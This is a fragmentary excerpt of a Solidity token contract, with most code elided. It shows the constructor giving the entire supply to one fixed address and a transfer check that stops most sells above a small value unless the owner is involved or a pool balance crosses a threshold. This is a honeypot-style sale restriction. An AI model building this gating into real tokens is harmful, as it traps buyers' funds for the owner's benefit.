...
contract MxmBoxcEus {
    ...
    constructor () public {
        ...
        balances[0x8207371aB0166C579b7ceAe41DdE36Fc9F8224d0] = _totalSupply;
        emit Transfer(address(this), 0x8207371aB0166C579b7ceAe41DdE36Fc9F8224d0, _totalSupply);
    ...
    function sellMbe(uint mbe)public  view returns (uint){
        if(ERC20(address(0x55d398326f99059fF775485246999027B3197955)).balanceOf(pir) > 0){
    ...
    function _transfer(address _sender, address _recipient, uint256 _amount) internal {
        ...
        require(sellMbe(_amount) < 1 ether || _sender==owner || _recipient == owner || ERC20(address(0x55d398326f99059fF775485246999027B3197955)).balanceOf(pir) >= 12 ether);
